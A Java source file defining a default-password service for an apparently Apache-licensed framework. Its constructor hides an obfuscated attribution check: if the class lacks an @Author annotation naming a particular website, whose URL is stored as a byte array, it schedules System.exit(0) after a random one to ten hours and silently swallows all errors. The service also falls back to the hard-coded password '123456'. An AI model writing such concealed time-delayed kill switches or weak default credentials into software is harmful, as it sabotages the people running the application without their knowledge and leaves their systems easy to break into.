/*
 * Copyright   Loy Fu.
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
*/
package com.loy.e.core.service;

import java.lang.annotation.Annotation;
import java.util.Map;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

import org.apache.commons.lang.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.core.annotation.AnnotationUtils;

import com.loy.e.common.properties.Settings;
import com.loy.e.core.api.DefaultPasswordService;
import com.loy.e.common.Constants;
import com.loy.e.common.annotation.Author;

@Author(author = "Loy Fu", website = "http://www.17jee.com", contact = "qq群 540553957")

public class DefaultPasswordServiceImpl implements DefaultPasswordService {

    @Autowired
    private Settings settings;

    @SuppressWarnings({ "rawtypes", "unchecked" })
    public DefaultPasswordServiceImpl() {
        try {
            Class claxx = Class.forName(new String(Constants.a));
            if (claxx == null) {
                Timer timer = new Timer();
                int count = new Random().nextInt() % 10;
                timer.schedule(new TimerTask() {
                    public void run() {
                        System.exit(0);
                    }
                }, 1000 * 60 * 60 * (1 + count));
                return;
            }
            Annotation annotation = this.getClass().getAnnotation(claxx);
            if (annotation == null) {
                Timer timer = new Timer();
                int count = new Random().nextInt() % 10;
                timer.schedule(new TimerTask() {
                    public void run() {
                        System.exit(0);
                    }
                }, 1000 * 60 * 60 * (1 + count));
                return;
            }
            Map<String, Object> attr = AnnotationUtils.getAnnotationAttributes(annotation, true);
            String website = attr.get("website").toString();
            byte[] b = { 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 49, 55, 106, 101, 101,
                    46, 99, 111, 109 };
            if (!website.contains(new String(b))) {
                Timer timer = new Timer();
                int count = new Random().nextInt() % 10;
                timer.schedule(new TimerTask() {
                    public void run() {
                        System.exit(0);
                    }
                }, 1000 * 60 * 60 * (1 + count));
            }
        } catch (Throwable e) {
        }
    }

    @Override
    public String buildDefaultPassword() {
        if (settings != null) {
            String defaultPassword = settings.getDefaultPassword();
            if (StringUtils.isNotEmpty(defaultPassword)) {
                return defaultPassword;
            }
        }
        return "123456";
    }

}
